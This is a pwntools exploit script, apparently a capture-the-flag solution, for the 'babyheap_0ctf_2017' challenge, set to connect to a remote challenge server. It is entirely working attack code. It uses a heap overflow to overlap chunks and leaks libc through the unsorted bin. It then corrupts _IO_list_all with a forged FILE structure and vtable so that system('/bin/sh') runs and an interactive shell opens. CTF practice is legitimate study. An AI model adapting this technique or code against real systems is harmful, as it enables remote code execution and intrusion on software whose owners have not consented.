from pwn import *
local = 0
if local :
    a=process("./babyheap_0ctf_2017")
    libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
else:
    a=remote("buuoj.cn","20001")
    libc=ELF("../x64_libc.so.6")
context.terminal=["tmux","splitw","-h"]
def debug():
    gdb.attach(a,'''
    b *(0x555555554000+0x000000000000E7D)
    b *(0x555555554000+0x000000000000F4E)
    b *(0x555555554000+0x00000000000104F)
    ''')
def menu(idx):
    a.recvuntil("Command: ")
    a.sendline(str(idx))
def add(size):
    menu(1)
    a.recvuntil("Size: ")
    a.sendline(str(size))
def edit(idx,size,content):
    menu(2)
    a.recvuntil("Index: ")
    a.sendline(str(idx))
    a.recvuntil("Size: ")
    a.sendline(str(size))
    a.recvuntil("Content: ")
    a.send(content)
def delete(idx):
    menu(3)
    a.recvuntil(": ")
    a.sendline(str(idx))
def show(idx):
    menu(4)
    a.recvuntil(": ")
    a.sendline(str(idx))
add(0x30)#0       0
add(0x30)#1       0x40
add(0x100)#2      0x80
add(0x30)#3       0x190
add(0x30)#4
edit(0,0x38+2,'A'*0x38+'\x51\x01')
delete(1)
add(0x148)#1 calloc
edit(1,0x40,'A'*0x38+p64(0x111))
delete(2)
show(1)
a.recvuntil(p64(0x0000000000000111))
main_arena=u64(a.recv(8))-88
libc_base=main_arena-libc.symbols["__malloc_hook"]-0x10
success("libc_base ==> 0x%x"%libc_base)

IO_file_jumps_offset = libc.sym['_IO_file_jumps']
IO_str_underflow_offset = libc.sym['_IO_str_underflow']
possible_IO_str_jumps_offset=0
for ref_offset in libc.search(p64(IO_str_underflow_offset)):
    possible_IO_str_jumps_offset = ref_offset - 0x20
    if possible_IO_str_jumps_offset > IO_file_jumps_offset:
        print possible_IO_str_jumps_offset
        break

io_str_jumps=libc_base+possible_IO_str_jumps_offset
io_list_all=libc_base+libc.symbols["_IO_list_all"]
bin_sh_addr=libc_base+next(libc.search("/bin/sh"))


payload='A'*0x30
fake_file=p64(0)+p64(0x61)                                 #fp ; to smallbin 0x60 (_chain)
fake_file+=p64(0)+p64(io_list_all-0x10)    #unsortedbin attack 
fake_file+=p64(1)+p64(2)                                     #_IO_write_base ; _IO_write_ptr 
fake_file+=p64(0)+p64(bin_sh_addr)                                    #_IO_buf_base=sh_addr 
fake_file=fake_file.ljust(0xd8,'\x00')             #mode<=0 
fake_file+=p64(io_str_jumps-8)                         #vtable=_IO_str_jump-8 
fake_file+=p64(0) 
fake_file+=p64(libc_base+libc.symbols["system"])  
payload+=fake_file
edit(1,len(payload),payload)
add(0x10)
#debug()
a.interactive()